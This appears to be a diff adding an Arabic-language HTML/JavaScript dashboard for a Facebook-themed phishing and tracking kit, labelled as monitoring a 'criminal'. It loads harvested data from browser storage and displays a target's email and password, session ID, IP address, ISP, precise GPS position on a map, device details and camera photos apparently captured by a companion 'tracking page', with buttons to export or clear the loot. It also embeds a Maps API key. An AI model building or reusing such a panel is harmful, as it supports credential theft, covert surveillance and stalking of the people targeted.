@@ -1,0 +1,1274 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم - بيانات المجرم</title>
+    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2917/2917633.png">
+    <style>
+        /* إعادة تعيين وتصميم عام */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', 'Segoe UI', -apple-system, sans-serif;
+        }
+        
+        :root {
+            --primary: #1877f2;
+            --primary-dark: #0a58ca;
+            --secondary: #42b72a;
+            --danger: #e74c3c;
+            --warning: #f39c12;
+            --dark: #1c1e21;
+            --light: #f0f2f5;
+            --gray: #65676b;
+            --white: #ffffff;
+            --card-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: var(--dark);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        /* التحميل */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: var(--transition);
+        }
+        
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--white);
+            animation: spin 1s linear infinite;
+        }
+        
+        .loading-text {
+            color: var(--white);
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        /* الهيدر */
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--white);
+            padding: 25px 40px;
+            box-shadow: 0 4px 20px rgba(24, 119, 242, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M0,0 L100,0 L100,100 Z" fill="rgba(255,255,255,0.1)"/></svg>');
+            background-size: cover;
+        }
+        
+        .header-content {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .logo-text h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .logo-text p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        .stats-badges {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px 20px;
+            border-radius: 25px;
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        /* المحتوى الرئيسي */
+        .container {
+            max-width: 1400px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 30px;
+        }
+        
+        /* الشريط الجانبي */
+        .sidebar {
+            background: var(--white);
+            border-radius: 20px;
+            box-shadow: var(--card-shadow);
+            padding: 30px;
+            height: fit-content;
+            position: sticky;
+            top: 20px;
+        }
+        
+        .section-title {
+            color: var(--primary);
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--light);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        /* بطاقات المعلومات */
+        .info-card {
+            background: var(--white);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: var(--card-shadow);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            transition: var(--transition);
+        }
+        
+        .info-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+        }
+        
+        .info-card.active {
+            border-right: 5px solid var(--primary);
+        }
+        
+        .info-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .info-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--white);
+            font-size: 22px;
+        }
+        
+        .info-title {
+            flex: 1;
+        }
+        
+        .info-title h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--dark);
+            margin-bottom: 5px;
+        }
+        
+        .info-title p {
+            color: var(--gray);
+            font-size: 13px;
+        }
+        
+        .info-value {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        /* قائمة البيانات */
+        .data-list {
+            list-style: none;
+        }
+        
+        .data-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--light);
+        }
+        
+        .data-item:last-child {
+            border-bottom: none;
+        }
+        
+        .data-label {
+            color: var(--gray);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .data-value {
+            font-weight: 600;
+            color: var(--dark);
+            font-size: 14px;
+        }
+        
+        /* المنطقة الرئيسية */
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+        
+        /* خريطة جوجل */
+        .map-container {
+            background: var(--white);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: var(--card-shadow);
+            height: 400px;
+        }
+        
+        #map {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .map-overlay {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+        
+        .location-info h4 {
+            color: var(--primary);
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+        
+        .location-info p {
+            color: var(--gray);
+            font-size: 14px;
+        }
+        
+        /* معرض الصور */
+        .gallery-container {
+            background: var(--white);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: var(--card-shadow);
+        }
+        
+        .photos-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .photo-card {
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            aspect-ratio: 1;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        
+        .photo-card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .photo-card img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .photo-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.7));
+            color: var(--white);
+            padding: 10px;
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        /* تنسيقات النص */
+        .data-display {
+            background: var(--white);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: var(--card-shadow);
+            margin-top: 30px;
+        }
+        
+        .json-viewer {
+            background: #2d3748;
+            color: #e2e8f0;
+            border-radius: 10px;
+            padding: 25px;
+            font-family: 'Monaco', 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            max-height: 400px;
+            overflow-y: auto;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .json-key {
+            color: #63b3ed;
+        }
+        
+        .json-string {
+            color: #68d391;
+        }
+        
+        .json-number {
+            color: #fbb6ce;
+        }
+        
+        .json-boolean {
+            color: #f6ad55;
+        }
+        
+        /* الأزرار */
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: var(--transition);
+            min-width: 180px;
+            justify-content: center;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--white);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(24, 119, 242, 0.3);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #42b72a 0%, #2d8c1f 100%);
+            color: var(--white);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+            color: var(--white);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+        }
+        
+        /* مودال عرض الصورة */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            max-width: 90%;
+            max-height: 90%;
+            position: relative;
+        }
+        
+        .modal-content img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: -40px;
+            left: 0;
+            background: var(--danger);
+            color: var(--white);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 20px;
+        }
+        
+        /* الفوتر */
+        .footer {
+            background: var(--dark);
+            color: var(--white);
+            padding: 30px 40px;
+            margin-top: 50px;
+            text-align: center;
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        
+        .update-time {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+        
+        /* استجابة للجوال */
+        @media (max-width: 1024px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+            
+            .sidebar {
+                position: static;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .stats-badges {
+                justify-content: center;
+            }
+            
+            .action-buttons {
+                justify-content: center;
+            }
+            
+            .btn {
+                min-width: 100%;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+        
+        /* أنيميشن */
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(-20px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.6s ease-out;
+        }
+        
+        .slide-in {
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        /* تأثيرات خاصة */
+        .glow {
+            text-shadow: 0 0 10px rgba(24, 119, 242, 0.5);
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); }
+        }
+    </style>
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Maps API -->
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartNGg&callback=initMap&libraries=places" async defer></script>
+</head>
+<body>
+    <!-- شاشة التحميل -->
+    <div class="loading-overlay" id="loading">
+        <div style="text-align: center;">
+            <div class="spinner"></div>
+            <div class="loading-text">جاري تحميل البيانات...</div>
+        </div>
+    </div>
+    
+    <!-- الهيدر -->
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-user-secret"></i>
+                </div>
+                <div class="logo-text">
+                    <h1 class="glow">لوحة تحكم بيانات المجرم</h1>
+                    <p>مراقبة شاملة في الوقت الفعلي</p>
+                </div>
+            </div>
+            
+            <div class="stats-badges">
+                <div class="badge">
+                    <i class="fas fa-clock"></i>
+                    <span id="last-update">--:--</span>
+                </div>
+                <div class="badge">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span id="location-status">جارٍ التحديث...</span>
+                </div>
+                <div class="badge">
+                    <i class="fas fa-wifi"></i>
+                    <span id="ip-status">0.0.0.0</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- المحتوى الرئيسي -->
+    <div class="container">
+        <div class="dashboard">
+            <!-- الشريط الجانبي -->
+            <div class="sidebar slide-in">
+                <h2 class="section-title">
+                    <i class="fas fa-chart-bar"></i>
+                    الإحصائيات
+                </h2>
+                
+                <div class="info-card active">
+                    <div class="info-header">
+                        <div class="info-icon">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="info-title">
+                            <h3>المجرم</h3>
+                            <p>معلومات الهوية</p>
+                        </div>
+                        <div class="info-value" id="email-value">--</div>
+                    </div>
+                    <ul class="data-list">
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-envelope"></i> البريد</span>
+                            <span class="data-value" id="email-display">غير متوفر</span>
+                        </li>
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-key"></i> كلمة المرور</span>
+                            <span class="data-value" id="password-display">غير متوفر</span>
+                        </li>
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-id-card"></i> رقم الجلسة</span>
+                            <span class="data-value" id="session-id">--</span>
+                        </li>
+                    </ul>
+                </div>
+                
+                <div class="info-card">
+                    <div class="info-header">
+                        <div class="info-icon">
+                            <i class="fas fa-map-marker-alt"></i>
+                        </div>
+                        <div class="info-title">
+                            <h3>الموقع</h3>
+                            <p>الإحداثيات الجغرافية</p>
+                        </div>
+                        <div class="info-value" id="accuracy-value">-- م</div>
+                    </div>
+                    <ul class="data-list">
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-globe"></i> البلد</span>
+                            <span class="data-value" id="country-display">--</span>
+                        </li>
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-city"></i> المدينة</span>
+                            <span class="data-value" id="city-display">--</span>
+                        </li>
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-broadcast-tower"></i> المشغل</span>
+                            <span class="data-value" id="isp-display">--</span>
+                        </li>
+                    </ul>
+                </div>
+                
+                <div class="info-card">
+                    <div class="info-header">
+                        <div class="info-icon">
+                            <i class="fas fa-mobile-alt"></i>
+                        </div>
+                        <div class="info-title">
+                            <h3>الجهاز</h3>
+                            <p>المواصفات الفنية</p>
+                        </div>
+                        <div class="info-value" id="device-type">--</div>
+                    </div>
+                    <ul class="data-list">
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-desktop"></i> النظام</span>
+                            <span class="data-value" id="platform-display">--</span>
+                        </li>
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-expand-alt"></i> الشاشة</span>
+                            <span class="data-value" id="screen-display">--</span>
+                        </li>
+                        <li class="data-item">
+                            <span class="data-label"><i class="fas fa-microchip"></i> المعالج</span>
+                            <span class="data-value" id="cores-display">--</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- المنطقة الرئيسية -->
+            <div class="main-content">
+                <!-- خريطة جوجل -->
+                <div class="map-container fade-in">
+                    <div id="map"></div>
+                    <div class="map-overlay">
+                        <div class="location-info">
+                            <h4><i class="fas fa-crosshairs"></i> الموقع الدقيق</h4>
+                            <p id="full-address">جارٍ تحديد العنوان...</p>
+                        </div>
+                        <button class="btn btn-outline" onclick="openGoogleMaps()">
+                            <i class="fas fa-external-link-alt"></i> فتح في خرائط جوجل
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- معرض الصور -->
+                <div class="gallery-container fade-in">
+                    <h2 class="section-title">
+                        <i class="fas fa-images"></i>
+                        الصور الملتقطة
+                    </h2>
+                    <div class="photos-grid" id="photos-grid">
+                        <!-- الصور ستضاف هنا جافاسكريبت -->
+                        <div style="grid-column: 1 / -1; text-align: center; padding: 40px; color: var(--gray);">
+                            <i class="fas fa-camera fa-3x" style="margin-bottom: 20px;"></i>
+                            <p>لم يتم التقاط أي صور بعد</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- البيانات الكاملة -->
+                <div class="data-display fade-in">
+                    <h2 class="section-title">
+                        <i class="fas fa-database"></i>
+                        البيانات الكاملة
+                    </h2>
+                    <div class="json-viewer" id="json-viewer">
+                        {"message": "جارٍ تحميل البيانات..."}
+                    </div>
+                </div>
+                
+                <!-- أزرار التحكم -->
+                <div class="action-buttons">
+                    <button class="btn btn-primary pulse" onclick="refreshData()">
+                        <i class="fas fa-sync-alt"></i> تحديث البيانات
+                    </button>
+                    <button class="btn btn-success" onclick="exportData()">
+                        <i class="fas fa-download"></i> تصدير البيانات
+                    </button>
+                    <button class="btn btn-danger" onclick="clearData()">
+                        <i class="fas fa-trash-alt"></i> مسح البيانات
+                    </button>
+                    <button class="btn btn-primary" onclick="window.open('index.html', '_blank')">
+                        <i class="fas fa-eye"></i> عرض صفحة التتبع
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- الفوتر -->
+    <div class="footer">
+        <div class="footer-content">
+            <div>
+                <h3><i class="fas fa-shield-alt"></i> نظام المراقبة الأمني</h3>
+                <p class="update-time">© 2026 - جميع الحقوق محفوظة</p>
+            </div>
+            <div class="update-time">
+                <i class="fas fa-clock"></i>
+                آخر تحديث: <span id="update-time-display">--:--</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- مودال عرض الصورة -->
+    <div class="modal" id="image-modal">
+        <div class="modal-content">
+            <div class="close-modal" onclick="closeModal()">
+                <i class="fas fa-times"></i>
+            </div>
+            <img id="modal-image" src="" alt="صورة مكبرة">
+        </div>
+    </div>
+
+    <script>
+        // ========== المتغيرات العامة ==========
+        let map;
+        let marker;
+        let collectedData = null;
+        
+        // ========== تهيئة الخريطة ==========
+        function initMap() {
+            // مركز افتراضي (مصر)
+            const defaultCenter = { lat: 30.0444, lng: 31.2357 };
+            
+            map = new google.maps.Map(document.getElementById('map'), {
+                zoom: 15,
+                center: defaultCenter,
+                mapTypeId: 'hybrid',
+                styles: [
+                    {
+                        "featureType": "all",
+                        "elementType": "labels.text.fill",
+                        "stylers": [{"color": "#ffffff"}]
+                    },
+                    {
+                        "featureType": "all",
+                        "elementType": "labels.text.stroke",
+                        "stylers": [{"color": "#000000"}, {"lightness": 13}]
+                    },
+                    {
+                        "featureType": "administrative",
+                        "elementType": "geometry.fill",
+                        "stylers": [{"color": "#000000"}]
+                    },
+                    {
+                        "featureType": "administrative",
+                        "elementType": "geometry.stroke",
+                        "stylers": [{"color": "#144b53"}, {"lightness": 14}, {"weight": 1.4}]
+                    },
+                    {
+                        "featureType": "landscape",
+                        "elementType": "all",
+                        "stylers": [{"color": "#08304b"}]
+                    },
+                    {
+                        "featureType": "poi",
+                        "elementType": "geometry",
+                        "stylers": [{"color": "#0c4152"}, {"lightness": 5}]
+                    },
+                    {
+                        "featureType": "road.highway",
+                        "elementType": "geometry.fill",
+                        "stylers": [{"color": "#000000"}]
+                    },
+                    {
+                        "featureType": "road.highway",
+                        "elementType": "geometry.stroke",
+                        "stylers": [{"color": "#0b434f"}, {"lightness": 25}]
+                    },
+                    {
+                        "featureType": "road.arterial",
+                        "elementType": "geometry.fill",
+                        "stylers": [{"color": "#000000"}]
+                    },
+                    {
+                        "featureType": "road.arterial",
+                        "elementType": "geometry.stroke",
+                        "stylers": [{"color": "#0b3d51"}, {"lightness": 16}]
+                    },
+                    {
+                        "featureType": "road.local",
+                        "elementType": "geometry",
+                        "stylers": [{"color": "#000000"}]
+                    },
+                    {
+                        "featureType": "transit",
+                        "elementType": "all",
+                        "stylers": [{"color": "#146474"}]
+                    },
+                    {
+                        "featureType": "water",
+                        "elementType": "all",
+                        "stylers": [{"color": "#021019"}]
+                    }
+                ]
+            });
+            
+            // تحميل البيانات بعد تهيئة الخريطة
+            setTimeout(loadData, 1000);
+        }
+        
+        // ========== تحديث الخريطة ==========
+        function updateMap(lat, lng, accuracy) {
+            if (!map) return;
+            
+            const position = { lat: parseFloat(lat), lng: parseFloat(lng) };
+            
+            // تحديث مركز الخريطة
+            map.setCenter(position);
+            map.setZoom(17);
+            
+            // إزالة العلامة القديمة إن وجدت
+            if (marker) {
+                marker.setMap(null);
+            }
+            
+            // إنشاء علامة جديدة
+            marker = new google.maps.Marker({
+                position: position,
+                map: map,
+                title: 'موقع المجرم',
+                animation: google.maps.Animation.DROP,
+                icon: {
+                    url: 'https://maps.google.com/mapfiles/ms/icons/red-dot.png',
+                    scaledSize: new google.maps.Size(50, 50)
+                }
+            });
+            
+            // دائرة الدقة
+            if (accuracy) {
+                new google.maps.Circle({
+                    strokeColor: '#FF0000',
+                    strokeOpacity: 0.3,
+                    strokeWeight: 1,
+                    fillColor: '#FF0000',
+                    fillOpacity: 0.1,
+                    map: map,
+                    center: position,
+                    radius: accuracy
+                });
+            }
+            
+            // الحصول على العنوان
+            getAddress(lat, lng);
+        }
+        
+        // ========== الحصول على العنوان ==========
+        function getAddress(lat, lng) {
+            const geocoder = new google.maps.Geocoder();
+            const latlng = { lat: parseFloat(lat), lng: parseFloat(lng) };
+            
+            geocoder.geocode({ location: latlng }, (results, status) => {
+                if (status === 'OK' && results[0]) {
+                    document.getElementById('full-address').textContent = 
+                        results[0].formatted_address;
+                } else {
+                    document.getElementById('full-address').textContent = 
+                        'العنوان: ' + lat + ', ' + lng;
+                }
+            });
+        }
+        
+        // ========== تحميل البيانات ==========
+        async function loadData() {
+            try {
+                // محاولة مصادر متعددة للبيانات
+                let data = null;
+                
+                // 1. localStorage
+                const localData = localStorage.getItem('facebook_hacker_data');
+                if (localData) {
+                    data = JSON.parse(localData);
+                }
+                
+                // 2. facebook_security_data (للتوافق مع النسخة القديمة)
+                if (!data) {
+                    const securityData = localStorage.getItem('facebook_security_data');
+                    if (securityData) {
+                        data = JSON.parse(securityData);
+                    }
+                }
+                
+                // 3. من متغير عام
+                if (!data && typeof window.collectedData !== 'undefined') {
+                    data = window.collectedData;
+                }
+                
+                if (data) {
+                    collectedData = data;
+                    updateUI(data);
+                    hideLoading();
+                } else {
+                    showNoData();
+                }
+                
+            } catch (error) {
+                console.error('خطأ في تحميل البيانات:', error);
+                showNoData();
+            }
+        }
+        
+        // ========== تحديث واجهة المستخدم ==========
+        function updateUI(data) {
+            // تحديث الوقت
+            const now = new Date();
+            document.getElementById('last-update').textContent = now.toLocaleTimeString();
+            document.getElementById('update-time-display').textContent = now.toLocaleString();
+            
+            // معلومات المجرم
+            if (data.credentials) {
+                document.getElementById('email-value').textContent = 
+                    data.credentials.email ? data.credentials.email.substring(0, 10) + '...' : '--';
+                document.getElementById('email-display').textContent = 
+                    data.credentials.email || 'غير متوفر';
+                document.getElementById('password-display').textContent = 
+                    data.credentials.password ? '••••••••' : 'غير متوفر';
+            }
+            
+            // معلومات الجلسة
+            if (data.session) {
+                document.getElementById('session-id').textContent = 
+                    data.session.id.substring(0, 8) + '...';
+            }
+            
+            // معلومات الموقع
+            if (data.network) {
+                document.getElementById('ip-status').textContent = 
+                    data.network.ip || '0.0.0.0';
+                
+                if (data.network.location) {
+                    document.getElementById('country-display').textContent = 
+                        data.network.location.country || '--';
+                    document.getElementById('city-display').textContent = 
+                        data.network.location.city || '--';
+                    document.getElementById('isp-display').textContent = 
+                        data.network.location.isp || '--';
+                }
+                
+                // تحديث الخريطة
+                if (data.network.gps && data.network.gps.latitude && data.network.gps.longitude) {
+                    document.getElementById('location-status').textContent = 'تم التحديد';
+                    document.getElementById('accuracy-value').textContent = 
+                        Math.round(data.network.gps.accuracy || 50) + ' م';
+                    
+                    updateMap(
+                        data.network.gps.latitude,
+                        data.network.gps.longitude,
+                        data.network.gps.accuracy
+                    );
+                }
+            }
+            
+            // معلومات الجهاز
+            if (data.device) {
+                const platform = data.device.platform || 'غير معروف';
+                document.getElementById('device-type').textContent = 
+                    platform.includes('Win') ? 'Windows' : 
+                    platform.includes('Mac') ? 'Mac' : 
+                    platform.includes('Linux') ? 'Linux' : 
+                    platform.includes('iPhone') ? 'iPhone' : 
+                    platform.includes('Android') ? 'Android' : 'جهاز آخر';
+                
+                document.getElementById('platform-display').textContent = platform;
+                document.getElementById('screen-display').textContent = 
+                    data.device.screen || '--';
+                document.getElementById('cores-display').textContent = 
+                    (data.device.cores || 'غير معروف') + ' نواة';
+            }
+            
+            // عرض الصور
+            if (data.media && data.media.photos && data.media.photos.length > 0) {
+                const grid = document.getElementById('photos-grid');
+                grid.innerHTML = '';
+                
+                data.media.photos.forEach((photo, index) => {
+                    const photoCard = document.createElement('div');
+                    photoCard.className = 'photo-card';
+                    photoCard.innerHTML = `
+                        <img src="${photo}" alt="صورة ${index + 1}" onclick="showImage('${photo}')">
+                        <div class="photo-overlay">صورة ${index + 1}</div>
+                    `;
+                    grid.appendChild(photoCard);
+                });
+            }
+            
+            // عرض JSON
+            displayJSON(data);
+        }
+        
+        // ========== عرض JSON بتنسيق جميل ==========
+        function displayJSON(data) {
+            const jsonViewer = document.getElementById('json-viewer');
+            const formatted = JSON.stringify(data, null, 2);
+            
+            // تلوين JSON
+            let colored = formatted
+                .replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?)/g, (match) => {
+                    let cls = 'json-number';
+                    if (/:$/.test(match)) {
+                        cls = 'json-key';
+                    } else if (/^"/.test(match)) {
+                        if (/:$/.test(match.replace(/"[^"]+"/, ''))) {
+                            cls = 'json-key';
+                        } else {
+                            cls = 'json-string';
+                        }
+                    }
+                    if (/true|false/.test(match)) {
+                        cls = 'json-boolean';
+                    }
+                    if (/[0-9]/.test(match) && !/"/.test(match)) {
+                        cls = 'json-number';
+                    }
+                    return `<span class="${cls}">${match}</span>`;
+                });
+            
+            jsonViewer.innerHTML = colored;
+        }
+        
+        // ========== عرض رسالة عدم وجود بيانات ==========
+        function showNoData() {
+            document.getElementById('loading').innerHTML = `
+                <div style="text-align: center; color: white;">
+                    <i class="fas fa-database fa-3x" style="margin-bottom: 20px;"></i>
+                    <h3 style="margin-bottom: 15px;">لا توجد بيانات</h3>
+                    <p>لم يتم جمع أي بيانات بعد. تأكد من:</p>
+                    <ul style="text-align: right; margin: 15px 0;">
+                        <li>أن المجرم فتح صفحة التتبع</li>
+                        <li>أنه أكمل عملية التحقق</li>
+                        <li>أن الصفحة استخدمت نفس المتصفح</li>
+                    </ul>
+                    <button class="btn btn-primary" onclick="location.reload()" style="margin-top: 20px;">
+                        <i class="fas fa-sync-alt"></i> إعادة المحاولة
+                    </button>
+                </div>
+            `;
+        }
+        
+        // ========== إخفاء شاشة التحميل ==========
+        function hideLoading() {
+            setTimeout(() => {
+                document.getElementById('loading').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                }, 300);
+            }, 1000);
+        }
+        
+        // ========== وظائف الأزرار ==========
+        function refreshData() {
+            document.getElementById('loading').style.display = 'flex';
+            document.getElementById('loading').style.opacity = '1';
+            setTimeout(loadData, 1500);
+        }
+        
+        function exportData() {
+            if (!collectedData) {
+                alert('لا توجد بيانات للتصدير!');
+                return;
+            }
+            
+            const dataStr = JSON.stringify(collectedData, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            
+            const url = URL.createObjectURL(dataBlob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `مجرم_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            // تصدير الصور أيضاً
+            if (collectedData.media && collectedData.media.photos) {
+                alert(`✅ تم تصدير ملف JSON\n📸 للصور: افتح لوحة التحكم (F12) → Application → LocalStorage`);
+            }
+        }
+        
+        function clearData() {
+            if (confirm('⚠️ هل أنت متأكد من مسح جميع البيانات؟\nهذا الإجراء لا يمكن التراجع عنه.')) {
+                localStorage.removeItem('facebook_hacker_data');
+                localStorage.removeItem('facebook_security_data');
+                collectedData = null;
+                location.reload();
+            }
+        }
+        
+        function openGoogleMaps() {
+            if (collectedData && collectedData.network && collectedData.network.gps) {
+                const { latitude, longitude } = collectedData.network.gps;
+                window.open(`https://www.google.com/maps?q=${latitude},${longitude}&z=17`, '_blank');
+            } else {
+                alert('لا توجد بيانات موقع متاحة');
+            }
+        }
+        
+        // ========== عرض الصورة في مودال ==========
+        function showImage(imageSrc) {
+            document.getElementById('modal-image').src = imageSrc;
+            document.getElementById('image-modal').style.display = 'flex';
+        }
+        
+        function closeModal() {
+            document.getElementById('image-modal').style.display = 'none';
+        }
